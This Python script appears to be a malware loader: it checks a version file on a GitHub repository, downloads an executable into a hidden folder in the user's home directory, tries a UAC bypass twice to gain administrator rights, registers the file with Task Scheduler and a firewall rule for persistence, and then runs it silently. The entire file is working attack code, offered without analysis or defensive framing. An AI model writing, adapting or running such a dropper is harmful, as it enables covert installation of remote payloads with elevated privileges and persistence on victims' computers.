import os
import urllib.request
import subprocess
from pathlib import Path
from uac_bypass import uac_bypass_and_disable, add_to_task_scheduler, add_firewall_rule, is_admin

# URLs and constants
VERSION_URL = "https://raw.githubusercontent.com/ShineCheeseEmWith556s/pywtf/refs/heads/main/version.txt"
FILE_URL = "https://github.com/ShineCheeseEmWith556s/pywtf/releases/download/fuckable/corerun938.exe"
FOLDER_NAME = ".hidden_service_folder"
FILE_NAME = "corerun938.exe"
VERSION_FILE_NAME = "previous_version.txt"

def ensure_and_run_file():
    print("[*] Starting the ensure_and_run_file function.")
    folder_path = Path.home() / FOLDER_NAME
    file_path = folder_path / FILE_NAME
    version_file_path = folder_path / VERSION_FILE_NAME

    if not folder_path.exists():
        print(f"[*] Creating hidden folder: {folder_path}")
        folder_path.mkdir(parents=True, exist_ok=True)

    # Get remote version
    try:
        print("[*] Checking for remote version...")
        with urllib.request.urlopen(VERSION_URL) as response:
            remote_version = response.read().decode('utf-8').strip()
    except Exception as e:
        print(f"[-] Failed to fetch remote version: {e}")
        return

    print(f"[+] Remote version: {remote_version}")

    # Check local version
    try:
        if version_file_path.exists():
            with open(version_file_path, 'r') as file:
                local_version = file.read().strip()
            print(f"[+] Local version: {local_version}")
        else:
            local_version = None
    except Exception as e:
        print(f"[-] Failed to read local version file: {e}")
        local_version = None

    if local_version == remote_version:
        print("[+] No update required. Local version matches remote version.")
        return

    # Download and replace the file
    try:
        print(f"[*] Downloading new file to: {file_path}")
        with urllib.request.urlopen(FILE_URL) as response, open(file_path, 'wb') as out_file:
            out_file.write(response.read())
        print("[+] Download completed.")
        with open(version_file_path, 'w') as file:
            file.write(remote_version)
        print("[+] Version updated.")
    except Exception as e:
        print(f"[-] Failed to download or update file: {e}")
        return

    # Apply UAC bypass twice if necessary
    for attempt in range(2):
        print(f"[*] Running UAC bypass (attempt {attempt + 1}/2)...")
        uac_bypass_and_disable()
        if is_admin():
            print("[+] Elevated privileges acquired.")
            break
        print("[-] UAC bypass did not elevate privileges. Retrying...")
    
    if not is_admin():
        print("[-] Failed to acquire elevated privileges after two attempts.")
        return

    # Add to task scheduler and firewall
    print("[*] Adding to task scheduler and firewall...")
    add_to_task_scheduler(str(file_path))
    add_firewall_rule(str(file_path))

    # Execute the file
    try:
        print(f"[*] Executing the file: {file_path}")
        subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] File executed.")
    except Exception as e:
        print(f"[-] Failed to execute the file: {e}")

if __name__ == "__main__":
    try:
        print("[*] Starting the manager script...")
        ensure_and_run_file()
        print("[*] Script completed.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
